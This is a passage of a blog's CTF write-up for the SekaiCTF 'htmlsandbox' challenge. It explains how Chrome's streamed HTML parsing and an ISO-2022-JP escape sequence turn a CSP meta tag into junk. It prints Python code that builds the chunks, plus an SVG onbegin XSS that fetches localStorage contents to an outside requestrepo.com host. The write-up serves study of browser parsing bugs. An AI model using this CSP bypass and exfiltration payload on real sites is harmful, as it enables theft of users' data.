</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;test.html&#39;</span>, <span style=color:#e6db74>&#34;wb&#34;</span>) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>   f<span style=color:#f92672>.</span>write(html)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(<span style=color:#e6db74>&#39;https://htmlsandbox.chals.sekai.team/upload&#39;</span>, data<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#39;html&#39;</span>: html})
</span></span><span style=display:flex><span>print(r<span style=color:#f92672>.</span>text)
</span></span></code></pre></div><p>This is what will happen when the code will get parsed in a non streamed mode(<code>data:uri</code>)</p><p>It will wait to load all the html, then sees the charset information and use it, the escape sequences like <code>\x1b$@</code> will try to get decoded but they won’t affect in any way the page</p><p><img src=/images/sekai/4.png alt=4.png></p><p>The page does have the csp set so basically there’s nothing to worry about, it seems just that there are junks data inside some comment and won’t make any problem</p><p><img src=/images/sekai/5.png alt=5.png></p><p>But everything changes when it get parsed over the network.</p><p>Let’s analyze the first chunk</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>...</span>
</span></span><span style=display:flex><span>c1 <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&#39;&#39;&lt;html&gt;&lt;head&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;!-- </span><span style=color:#ae81ff>\x1b</span><span style=color:#e6db74>$@ aa --&gt;&#39;&#39;&#39;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;meta http-equiv=&#34;Content-Security-Policy&#34; content=&#34;default-src &#39;none&#39;&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74></span><span style=color:#ae81ff>\x1b</span><span style=color:#e6db74>(B &lt;!-- test --&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x1b</span><span style=color:#e6db74>(B&lt;!-- &#34;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;A&#34;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>64000</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;--&gt;&#34;</span><span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&lt;!--&#34;</span><span style=color:#f92672>+</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;A&#34;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>100</span><span style=color:#f92672>+</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;--&gt;&#34;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>...</span>
</span></span></code></pre></div><p>The key point in the first chunks relies on the following escape sequence used at the start <code>\x1b$@</code> which will switch from that point on the encoding to <code>JIS X 0208 1983</code> which is not compatible with ascii which will change the encoding of the following characters to japanes one(eg. <code>�瘁�⑬</code>) So what it will do is that it will break out of the comment, eat everything and also the csp will becomes some japanese character until it does encounter the sequence <code>\x1b(B</code> which will return to the ascii rappresentation, therefore the trailed <code>&lt;!--</code>
from the beginning will find it’s closing tag in here <code>test --></code> (Since we opened a comment earlier also the <code>&lt;!--</code> before the test string will be commented out).
Then we set an another time the encoding to be ascii(optional) and fill the tcp packet.</p><p>Just to make everything easier to understand here’s what the first chunk gets evaluated to in the streamed parsed mode</p><p><img src=/images/sekai/6.png alt=6.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>html</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>head</span>&gt;
</span></span><span style=display:flex><span>  <span style=color:#75715e>&lt;!-- �瘁�⑬�狩續�蔗�㊤髟蝟就衷銓緕�嚆笊鱸�㎜闌蜒褜�竢銓緕�≫繙癜踉∮鱆�ь闔紮⊂� &lt;!-- test --&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!-- AAAA junks --&gt;</span>
</span></span></code></pre></div><p>So we have successfully dropped the csp, we made it become this<code>�瘁�⑬�狩續�蔗�㊤髟蝟就衷銓緕�嚆笊鱸�㎜闌蜒褜�竢銓緕�≫繙癜踉∮鱆�ь闔紮⊂�</code></p><p>Now let’s go to the second chunk</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>...</span>
</span></span><span style=display:flex><span>c2 <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;meta charset=&#34;utf-8&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;/head&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;body&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;svg&gt;&lt;animate onbegin=&#34;fetch(`https://s9cs3dwb.requestrepo.com?c=${localStorage.getItem(&#39;flag&#39;)}`)&#34; attributeName=&#34;x&#34; dur=&#34;1s&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;/body&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;/html&gt;&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>...</span>
</span></span></code></pre></div><p>Here we declare the charset to be utf-8 so that from this moment on there is a valid charset, the browser does not have to sniff anything in order to determine the charset. Then we use a payload which won’t be filtered out to get the xss.</p><style>.callout{background:#2a2a2a;padding:.5em 1.25em;border-radius:5px;margin-bottom:20px;box-shadow:0 2px 10px rgba(0,0,0,.2);color:#e0e0e0;cursor:pointer;transition:all .3s ease-out;overflow:hidden}.callout-header{display:flex;align-items:center;flex-wrap:wrap}.callout-header div{display:inline-flex;align-items:center;margin-right:10px}.callout-header .emoji{font-size:1.2em;margin-right:.5em}.callout-inner{margin-left:1em;max-height:0;overflow:hidden;transition:max-height .3s ease-out,opacity .3s ease-out;opacity:0;flex-basis:100%}.callout.expanded .callout-inner{max-height:100px;opacity:1}.toggle-btn{background:0 0;border:none;color:#e0e0e0;font-size:1.25em;margin-right:10px;cursor:pointer;transition:transform .3s ease}.expanded .toggle-btn{transform:rotate(90deg)}@media(max-width:767px){.callout{padding:.5em .75em .5em .6em}.callout-inner{margin-left:.5em}}</style><div class=callout onclick=toggleCallout(this)><div class=callout-header><button class=toggle-btn>></button><div class=emoji>💡</div><div>TIP</div></div><div class=callout-inner>If you are wondering how i came up with this <code>svg</code> payload, I compared the blacklisted event handlers in the code to the one present in portswigger xss cheatsheet</div></div><script>function toggleCallout(e){const t=e.querySelector(".callout-inner"),n=e.classList.contains("expanded");n?t.style.maxHeight=null:t.style.maxHeight=t.scrollHeight+"px",e.classList.toggle("expanded")}</script><p>In the end the document in the streamed mode will be parsed in the following way, crafting a valid xss payload while at the same time dropping the csp</p><p><img src=/images/sekai/7.png alt=7.png></p><p><img src=/images/sekai/8.png alt=8.png></p><p>Request being made to the webhook</p><p><img src=/images/sekai/9.png alt=9.png></p><p>Now just report the url to the bot and we get the flag from the localStorage</p><p><code>SEKAI{html_parsing_is_hard_eba4d51737}</code></p><p>So in the end the main key point here are the following:</p><ul><li>non streamed parsing(<code>data:uri</code>) will wait for the whole document to load and then determine the charset, finding that there is a charset specified with a meta tag, therefore using <code>UTF-8</code> as the charset.</li><li>streamed parsing html in order to improve the rendering performance does not wait for the whole document to load but instead it evaluates the first chunks sniffing and guessing the charset by the character present in it and using the guessed encoding, when it gets to the second chunk and sees a meta tag specifying the charset it does not re-encode the previous chunk but instead it goes on using this time the specified charset.</li></ul><style>.callout{background:#2a2a2a;padding:.5em 1.25em;border-radius:5px;margin-bottom:20px;box-shadow:0 2px 10px rgba(0,0,0,.2);color:#e0e0e0;cursor:pointer;transition:all .3s ease-out;overflow:hidden}.callout-header{display:flex;align-items:center;flex-wrap:wrap}.callout-header div{display:inline-flex;align-items:center;margin-right:10px}.callout-header .emoji{font-size:1.2em;margin-right:.5em}.callout-inner{margin-left:1em;max-height:0;overflow:hidden;transition:max-height .3s ease-out,opacity .3s ease-out;opacity:0;flex-basis:100%}.callout.expanded .callout-inner{max-height:100px;opacity:1}.toggle-btn{background:0 0;border:none;color:#e0e0e0;font-size:1.25em;margin-right:10px;cursor:pointer;transition:transform .3s ease}.expanded .toggle-btn{transform:rotate(90deg)}@media(max-width:767px){.callout{padding:.5em .75em .5em .6em}.callout-inner{margin-left:.5em}}</style><div class=callout onclick=toggleCallout(this)><div class=callout-header><button class=toggle-btn>></button><div class=emoji>🚨</div><div>NOTE</div></div><div class=callout-inner>As pointed out to me by @<strong>bawolff network conditions affect this a lot which won’t make the same exploit work under localhost.</strong></div></div><script>function toggleCallout(e){const t=e.querySelector(".callout-inner"),n=e.classList.contains("expanded");n?t.style.maxHeight=null:t.style.maxHeight=t.scrollHeight+"px",e.classList.toggle("expanded")}</script><p>I enjoyed a lot this challenge, big shoutout to the author with his immaculate writeup and fantastic challenge, however I was not able to solve it during the ctf, nevertheless i started spending a lot of time and also thanks to the help of @bawolff I understood the challenge in depth and came up with my payload</p><p><a href=https://blog.ankursundara.com/htmlsandbox-writeup/ target=_blank>https://blog.ankursundara.com/htmlsandbox-writeup/</a></p><p>NOTE:</p><style>.callout{background:#2a2a2a;padding:.5em 1.25em;border-radius:5px;margin-bottom:20px;box-shadow:0 2px 10px rgba(0,0,0,.2);color:#e0e0e0;cursor:pointer;transition:all .3s ease-out;overflow:hidden}.callout-header{display:flex;align-items:center;flex-wrap:wrap}.callout-header div{display:inline-flex;align-items:center;margin-right:10px}.callout-header .emoji{font-size:1.2em;margin-right:.5em}.callout-inner{margin-left:1em;max-height:0;overflow:hidden;transition:max-height .3s ease-out,opacity .3s ease-out;opacity:0;flex-basis:100%}.callout.expanded .callout-inner{max-height:100px;opacity:1}.toggle-btn{background:0 0;border:none;color:#e0e0e0;font-size:1.25em;margin-right:10px;cursor:pointer;transition:transform .3s ease}.expanded .toggle-btn{transform:rotate(90deg)}@media(max-width:767px){.callout{padding:.5em .75em .5em .6em}.callout-inner{margin-left:.5em}}</style><div class=callout onclick=toggleCallout(this)><div class=callout-header><button class=toggle-btn>></button><div class=emoji>📌</div><div>chrome</div></div><div class=callout-inner>This exploit takes advantage of the fact that chrome will not follow the html spec about parsing that can be found in here <a href=https://html.spec.whatwg.org/multipage/parsing.html#the-input-byte-stream target=_blank>https://html.spec.whatwg.org/multipage/parsing.html#the-input-byte-stream</a></div></div><script>function toggleCallout(e){const t=e.querySelector(".callout-inner"),n=e.classList.contains("expanded");n?t.style.maxHeight=null:t.style.maxHeight=t.scrollHeight+"px",e.classList.toggle("expanded")}</script><style>.callout{background:#2a2a2a;padding:.5em 1.25em;border-radius:5px;margin-bottom:20px;box-shadow:0 2px 10px rgba(0,0,0,.2);color:#e0e0e0;cursor:pointer;transition:all .3s ease-out;overflow:hidden}.callout-header{display:flex;align-items:center;flex-wrap:wrap}.callout-header div{display:inline-flex;align-items:center;margin-right:10px}.callout-header .emoji{font-size:1.2em;margin-right:.5em}.callout-inner{margin-left:1em;max-height:0;overflow:hidden;transition:max-height .3s ease-out,opacity .3s ease-out;opacity:0;flex-basis:100%}.callout.expanded .callout-inner{max-height:100px;opacity:1}.toggle-btn{background:0 0;border:none;color:#e0e0e0;font-size:1.25em;margin-right:10px;cursor:pointer;transition:transform .3s ease}.expanded .toggle-btn{transform:rotate(90deg)}@media(max-width:767px){.callout{padding:.5em .75em .5em .6em}.callout-inner{margin-left:.5em}}</style><div class=callout onclick=toggleCallout(this)><div class=callout-header><button class=toggle-btn>></button><div class=emoji>❓</div><div>EVENT HANDLERS</div></div><div class=callout-inner>For those wondering if others event handlers could be used I ran a simple script which gave me the allowed event handlers: <a href=https://pastebin.com/juxAPefP target=_blank>https://pastebin.com/juxAPefP</a></div></div><script>function toggleCallout(e){const t=e.querySelector(".callout-inner"),n=e.classList.contains("expanded");n?t.style.maxHeight=null:t.style.maxHeight=t.scrollHeight+"px",e.classList.toggle("expanded")}</script><hr><div class=footer><div class=next-post><a href="https://0xAlessandro.github.io/posts/twitter-chall/?ref=footer"><span style=font-weight:700>Next »</span><br>Twitter Chall</a></div></div></div></main><div class=article-toc-overlay aria-label="Table of contents"><div class=toc-handle aria-hidden=true></div><div class=toc-panel><h4 id=contents>Contents</h4><nav id=TableOfContents><ul><li><a href=#poc>POC</a></li></ul></nav></div></div></div><a href=# id=backToTop class=back-to-top aria-label="Back to top"><svg class="arrow-icon" viewBox="0 0 24 24" aria-hidden="true"><g fill="none" stroke="currentcolor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M12 19V7"/><path d="M6 11l6-6 6 6"/></g></svg><svg class="ring" viewBox="0 0 36 36" aria-hidden="true"><path class="ring-bg" d="M18 2a16 16 0 110 32 16 16 0 110-32"/><path class="ring-fg" d="M18 2a16 16 0 110 32 16 16 0 110-32"/></svg></a></body></html>